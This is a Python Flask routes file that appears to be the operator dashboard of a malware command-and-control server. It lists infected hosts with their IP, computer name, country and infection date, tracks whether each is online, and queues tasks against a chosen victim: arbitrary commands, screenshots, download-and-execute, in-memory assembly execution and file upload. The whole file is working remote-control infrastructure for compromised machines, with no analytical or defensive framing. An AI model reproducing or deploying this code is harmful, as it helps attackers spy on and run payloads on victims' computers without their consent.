from flask import render_template, jsonify, request, redirect, url_for
from app.main import bp
from flask_login import login_required
from datetime import datetime
from app.models import Host, Task
from app import db
from app.main.forms import EmptyForm
import base64


@bp.route('/', methods=['GET', 'POST'])
@bp.route('/index', methods=['GET', 'POST'])
@login_required
def index():
    """
    Renders dashboard page
    """
    form = EmptyForm()
    return render_template('index.html', title='Home', route="index", form=form)


def check_if_online():
    for host in db.session.query(Host).all():
        now = datetime.now()
        last = host.last
        compared = now - last
        finalcompared = compared.seconds
        if finalcompared > 180: 
            host.status = "Offline"
            db.session.commit()


@bp.route('/ajax-host-list', methods=['GET'])
@login_required
def ajax_host_list():
    """
    Ajax request to render host list table
    """
    check_if_online()
    status_html = """<span class="badge badge-{}">{}</span>"""
    date_format = '%d.%m.%Y:%H:%M:%S'
    online_count = Host.query.filter_by(status='Online').count()
    task_count = Task.query.count()
    host_count = Host.query.count()
    data = [
        [
            h.id, h.ip, h.computername, h.country, 
            datetime.strftime(h.last, date_format), 
            datetime.strftime(h.infection_date, date_format), 
            h.notes, 
            status_html.format("danger",h.status) if h.status == "Offline" else status_html.format("success",h.status),
            """
                <a href="{}" class="tableActionIcons" title="View">
                    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="24" viewBox="0 0 24 24" fill="none" 
                    stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" 
                    class="feather feather-disc">
                    <circle cx="12" cy="12" r="10"></circle>
                    <circle cx="12" cy="12" r="3"></circle>
                    </svg>
                </a>
                <a href="#" data-url="{}" class="tableActionIcons createEditNotes" title="Edit">
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" 
                    stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" 
                    class="feather feather-edit-2">
                    <path d="M17 3a2.828 2.828 0 1 1 4 4L7.5 20.5 2 22l1.5-5.5L17 3z"></path>
                    </svg>
                </a>
                <div class="btn-group">
                <a href="#" data-url="{}" class="tableActionIcons executeCommand" title="Execute" id="dropdownMenuLink" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                   <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" 
                   stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" 
                   class="feather feather-crosshair">
                   <circle cx="12" cy="12" r="10"></circle>
                   <line x1="22" y1="12" x2="18" y2="12"></line><line x1="6" y1="12" x2="2" y2="12"></line>
                   <line x1="12" y1="6" x2="12" y2="2"></line><line x1="12" y1="22" x2="12" y2="18"></line>
                   </svg>
                </a>
                <div class="dropdown-menu" aria-labelledby="dropdownMenuLink">
                    <a class="dropdown-item" href="#" data-bs-toggle="modal" 
                    data-bs-target="#commandModal">Command</a>
                    <a class="dropdown-item" id="screenshot" href="{}">Screenshot</a>
                    <a class="dropdown-item optionDownloadExecute" data-bs-toggle="modal" data-bs-target="#downloadExecuteModal" href="#" data-url="{}">Download & Execute</a>
                    <a class="dropdown-item optionExecuteAssembly" data-bs-toggle="modal" data-bs-target="#executeAssemblyModal" href="#" data-url="{}">Execute Assembly</a>
                    <a class="dropdown-item optionFileUpload" data-bs-toggle="modal" data-bs-target="#fileUploadModal" href="#" data-url="{}">Upload File</a>
                </div>
                </div>
                <a href="#" data-url="{}" class="tableActionIcons deleteHost" title="Delete">
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" 
                    stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" 
                    class="feather feather-trash-2">
                    <polyline points="3 6 5 6 21 6"></polyline>
                    <path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"></path>
                    <line x1="10" y1="11" x2="10" y2="17"></line><line x1="14" y1="11" x2="14" y2="17"></line>
                    </svg>
                </a>""".format(
                    url_for('host.host_detail', pk=h.id),
                    url_for('main.host_notes_create_edit', pk=h.id), 
                    url_for('main.host_execute_command', pk=h.id),
                    url_for('main.take_screenshot', pk=h.id),
                    url_for('main.take_action', pk=h.id, task_type='downexec'),
                    url_for('main.take_action', pk=h.id, task_type='assembly'),
                    url_for('main.take_action', pk=h.id, task_type='upload'),
                    url_for('main.host_delete', pk=h.id))
        ] for h in db.session.query(Host).all()]
    response = {
        'data': data, 'online_count': online_count, 'task_count': task_count,
        'host_count': host_count
    }
    return jsonify(response)


@bp.route('/host-delete/<int:pk>', methods=['POST'])
@login_required
def host_delete(pk):
    """
    Delete a host and redirects to dashboard
    """
    form = EmptyForm(request.form)
    if request.method == 'POST' and form.validate():
        obj = Host.query.get(pk)
        db.session.delete(obj)
        db.session.commit()
        return redirect(url_for('main.index'))


@bp.route('/host-notes-create-edit/<int:pk>', methods=['POST'])
@login_required
def host_notes_create_edit(pk):
    """
    Create/Edit host notes and redirects to dashboard
    """
    form = EmptyForm(request.form)
    if request.method == 'POST' and form.validate():
        notes = request.form.get('notes', None)
        obj = Host.query.get(pk)
        obj.notes = notes.strip()
        db.session.commit()
        return redirect(url_for('main.index'))


@bp.route('/host-execute-command/<int:pk>', methods=['POST'])
@login_required
def host_execute_command(pk):
    """
    Execute host command and redirects to dashboard
    """

    form = EmptyForm(request.form)
    if request.method == 'POST' and form.validate():
        command = request.form.get('command', None)
        obj = Host.query.get(pk)
        obj = Task(task_type="command", computername=obj.computername, command=command, guid=obj.guid, status="new")
        db.session.add(obj)
        db.session.commit()
        return redirect(url_for('main.index'))


@bp.route('/screenshot/<int:pk>', methods=['GET'])
@login_required
def take_screenshot(pk):
    """
    Process screenshot action on client 
    """
    form = EmptyForm(request.form)
    if request.method == 'GET':
        obj = Host.query.get(pk)
        obj = Task(task_type="screenshot", computername=obj.computername, guid=obj.guid, status="new")
        db.session.add(obj)
        db.session.commit()
        return redirect(url_for('main.index'))


@bp.route('/task-action/<int:pk>/<string:task_type>', methods=['POST'])
@login_required
def take_action(pk, task_type):
    """
    Creates new task object on the basis of host action like downexec, assembly, upload 
    """
    if request.method == 'POST':
        obj = Host.query.get(pk)
        fileobj = request.files['file']
        file_base64 = base64.b64encode(fileobj.read())
        obj = Task(
            task_type=task_type, computername=obj.computername, guid=obj.guid, 
            status="new", file_input=file_base64)
        db.session.add(obj)
        db.session.commit()
        return redirect(url_for('main.index'))
